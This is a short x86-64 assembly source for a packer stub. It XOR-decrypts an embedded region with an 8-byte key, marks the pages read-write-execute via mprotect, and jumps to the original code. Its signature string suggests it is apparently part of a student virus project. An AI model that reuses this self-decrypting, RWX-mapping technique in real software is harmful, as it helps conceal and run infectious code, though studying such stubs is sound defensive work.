BITS 64
default rel

global packer_start
global packer_end
global jmp_rel
global sign

%define PROT_READ   0x1
%define PROT_WRITE  0x2
%define PROT_EXEC   0x4

%define PAGE_SIZE 0x1000

extern end

packer_start:
	push rdx

	cmp byte [rel key], 0
	je .mprotect_data

	lea rsi, [rel packer_start]
	add rsi, [rel offset_to_data]
	mov rcx, [rel size_to_decrypt]


	lea rdi, [rel key]
	xor rbx, rbx

.loop:
	cmp rcx, 0
	je .mprotect_data

	mov al, byte [rdi + rbx]
	xor byte [rsi], al
	
	inc rsi
	dec rcx
	inc rbx

	and rbx, 0x07

	jmp .loop

; commented this out cause of valgrind segfault
.mprotect_data:
	lea rdi, [rel packer_start]
	add rdi, [rel offset_to_data]
	and rdi, ~(PAGE_SIZE - 1)

	mov rax, 10
	mov rsi, [rel data_page_size]
	;and rsi, ~(PAGE_SIZE - 1)
	mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC

	syscall

.exit:
	pop rdx

jmp_rel:
	jmp end

sign:
	db "War (c)oded by [diroyer] & [eamar] - deadbeaf:0000", 0x0a, 0

data_page_size:
	dq 0x0

size_to_decrypt:
	dq 0x0

offset_to_data:
	dq 0x0

key:
	dq 0x0

packer_end:
	nop
